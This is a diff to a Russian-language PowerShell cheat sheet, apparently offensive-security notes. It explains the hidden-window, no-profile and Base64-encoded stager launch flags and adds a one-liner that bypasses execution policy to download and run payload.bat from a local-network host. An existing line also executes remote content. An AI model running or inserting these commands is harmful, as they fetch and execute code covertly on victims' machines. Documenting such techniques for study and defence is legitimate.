@@ -1,3 +1,14 @@
+# Параметры запуска powershell
+
+`-NoP` сокращение NoProfile. Предотвращает PowerShell пользовательские настройки из профиля
+
+`-NonI` предотвращает отображение пользователю интерактивной подсказки
+
+`-W Hidden` задает окну PowerShell стиль _Hidden_, чтобы на экране не появлялась консоль PowerShell. Отметим, bat-файл, который запускает PowerShell показывает консоль, а PowerShell нет.
+
+`-Command` команда, которая будет исполнена. В этой команде, закодированной Base64, содержится stage и stager, загружаемый в памяти и исполняемый там. 
+
+
 # Полезные командлеты Powershell
 
 ## Invoke-WebRequest
@@ -15,6 +26,10 @@
 ## Выполнить команду с удаленного веб-сервера
 
 `Invoke-Expression (Invoke-WebRequest -Uri http://192.168.1.114/command.txt).Content`
+
+## Загрузить и исполнить файл
+
+`powershell.exe -exec bypass -noprofile -windowstyle hidden -Command "IEX (New-Object Net.Webclient).downloadstring('http://192.168.1.114:8000/payload.bat')"`
 
 ## Рекурсивный поиск файла по регулярному выражению его имени
 
